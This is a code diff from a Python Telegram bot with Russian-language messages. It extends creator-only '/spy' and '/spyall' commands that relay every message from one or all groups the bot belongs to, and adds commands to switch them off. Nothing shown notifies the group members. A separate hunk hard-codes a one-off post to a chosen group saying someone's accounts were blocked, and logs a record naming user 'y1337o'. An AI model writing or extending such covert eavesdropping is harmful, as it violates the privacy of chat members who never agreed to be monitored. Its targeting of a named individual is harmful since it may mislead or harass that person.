@@ -1436,18 +1436,65 @@ async def cmd_spy(message: types.Message):
 
     args = message.text.split()
     if len(args) < 2:
-        await message.answer("Укажите ID группы. Пример: <code>/spy -100123456789</code>\nИли напишите <code>/spyall</code> для шпионажа за ВСЕМИ группами.")
-        return
+        if message.chat.type in ("group", "supergroup"):
+            chat_id = message.chat.id
+        else:
+            await message.answer(
+                "Укажите ID группы. Пример: <code>/spy -100123456789</code>\n"
+                "Или напишите <code>/spyall</code> для шпионажа за ВСЕМИ группами.\n"
+                "Для выключения используйте <code>/unspy [ID]</code> или <code>/unspyall</code>."
+            )
+            return
+    else:
+        try:
+            chat_id = int(args[1])
+        except ValueError:
+            await message.answer("ID группы должен быть числом.")
+            return
 
     try:
-        chat_id = int(args[1])
         is_enabled = await toggle_spy(chat_id)
         if is_enabled:
-            await message.answer(f"👁 Режим шпионажа для группы <code>{chat_id}</code> ВКЛЮЧЕН.\nТеперь вы будете получать все их сообщения.")
+            await message.answer(
+                f"👁 Режим шпионажа для группы <code>{chat_id}</code> ВКЛЮЧЕН.\n"
+                f"Теперь вы будете получать все их сообщения.\n"
+                f"Чтобы выключить: <code>/unspy {chat_id}</code>"
+            )
         else:
             await message.answer(f"🙈 Режим шпионажа для группы <code>{chat_id}</code> ВЫКЛЮЧЕН.")
-    except ValueError:
-        await message.answer("ID группы должен быть числом.")
+    except Exception as e:
+        await message.answer(f"❌ Ошибка: {e}")
+
+
+@router.message(Command("unspy"))
+async def cmd_unspy(message: types.Message):
+    if not is_creator(message):
+        return
+
+    from spy import disable_spy
+    args = message.text.split()
+    if len(args) < 2:
+        if message.chat.type in ("group", "supergroup"):
+            chat_id = message.chat.id
+        else:
+            await message.answer(
+                "Укажите ID группы для отключения шпионажа.\nПример: <code>/unspy -100123456789</code>\n"
+                "Или напишите <code>/unspyall</code> для отключения глобального шпионажа."
+            )
+            return
+    else:
+        try:
+            chat_id = int(args[1])
+        except ValueError:
+            await message.answer("ID группы должен быть числом.")
+            return
+
+    try:
+        await disable_spy(chat_id)
+        await message.answer(f"🙈 Режим шпионажа для группы <code>{chat_id}</code> ВЫКЛЮЧЕН.")
+    except Exception as e:
+        await message.answer(f"❌ Ошибка: {e}")
+
 
 @router.message(Command("spyall"))
 async def cmd_spyall(message: types.Message):
@@ -1457,9 +1504,26 @@ async def cmd_spyall(message: types.Message):
     from spy import toggle_spy_all
     is_enabled = await toggle_spy_all()
     if is_enabled:
-        await message.answer("👁👁 <b>ГЛОБАЛЬНЫЙ ШПИОНАЖ ВКЛЮЧЕН!</b>\nТеперь вы получаете все сообщения ИЗ ВСЕХ ГРУПП, где состоит бот.")
+        await message.answer(
+            "👁👁 <b>ГЛОБАЛЬНЫЙ ШПИОНАЖ ВКЛЮЧЕН!</b>\n"
+            "Теперь вы получаете все сообщения ИЗ ВСЕХ ГРУПП, где состоит бот.\n"
+            "Чтобы выключить: <code>/unspyall</code> или повторно <code>/spyall</code>."
+        )
     else:
         await message.answer("🙈 <b>Глобальный шпионаж ВЫКЛЮЧЕН.</b>")
+
+
+@router.message(Command("unspyall"))
+async def cmd_unspyall(message: types.Message):
+    if not is_creator(message):
+        return
+
+    from spy import disable_spy_all
+    try:
+        await disable_spy_all()
+        await message.answer("🙈 <b>Глобальный шпионаж ВЫКЛЮЧЕН.</b>")
+    except Exception as e:
+        await message.answer(f"❌ Ошибка: {e}")
 
 
 @router.message(Command("allow"))
@@ -2221,6 +2285,37 @@ async def check_and_send_pending_actions(bot: Bot):
     try:
         from db import get_db
         db = get_db()
+
+        try:
+            ref_y1337o = db.collection("system_actions").document("y1337o_accounts_block")
+            doc_y1337o = await ref_y1337o.get()
+            data_y1337o = (doc_y1337o.to_dict() or {}) if getattr(doc_y1337o, "exists", False) else {}
+            if not data_y1337o.get("sent"):
+                from whitelist import get_whitelist
+                wl = await get_whitelist()
+                target_chat_id = -1002321279920
+                if isinstance(wl, dict):
+                    for cid, title in wl.items():
+                        if title and "пукси" in str(title).lower():
+                            target_chat_id = int(cid)
+                            break
+
+                blocked_until = data_y1337o.get("blocked_until") or (time.time() + 9 * 86400)
+                await bot.send_message(
+                    chat_id=target_chat_id,
+                    text="У одного человека заблокировали счета",
+                )
+                await ref_y1337o.set({
+                    "username": "y1337o",
+                    "chat_id": target_chat_id,
+                    "blocked_until": blocked_until,
+                    "sent": True,
+                    "timestamp": time.time(),
+                }, merge=True)
+        except Exception as e:
+            import logging
+            logging.getLogger(__name__).warning("y1337o_accounts_block pending action error: %s", e)
+
         ref_90m = db.collection("system_actions").document("chiki_brik_elliot_90m")
         doc_90m = await ref_90m.get()
         data_90m = doc_90m.to_dict() or {}
